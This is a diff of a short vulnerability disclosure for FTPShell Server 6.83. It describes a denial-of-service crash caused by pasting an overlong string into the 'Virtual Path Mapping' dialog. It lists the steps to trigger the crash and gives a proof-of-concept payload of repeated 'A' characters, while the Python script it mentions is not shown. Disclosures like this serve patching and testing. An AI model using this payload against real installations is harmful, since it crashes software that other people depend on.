@@ -1,10 +1,11 @@
 # FTPShell Server 6.83  -- Denial of Service
 
->Discoverer: leiothrix
->Discovery time: 2019/4/27
->Tested Version: 6.83
->Software Link: http://www.ftpshell.com/downloadserver.htm
+Discoverer: leiothrix
+Discovery time: 2019/4/27
+###Tested Version: 6.83
+###Software Link: http://www.ftpshell.com/downloadserver.htm
 
+```
 Steps to exploit:
 1.Run Python Code
 2.Open the txt file and copy content to clipboard
@@ -13,6 +14,7 @@ Steps to exploit:
 3.Select "Configure accounts..."
 4.Select "Add path" and in "Virtual Path Mapping" Paste Clipboard
 5.Click on "OK"
+```
 
 POC:
 >AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
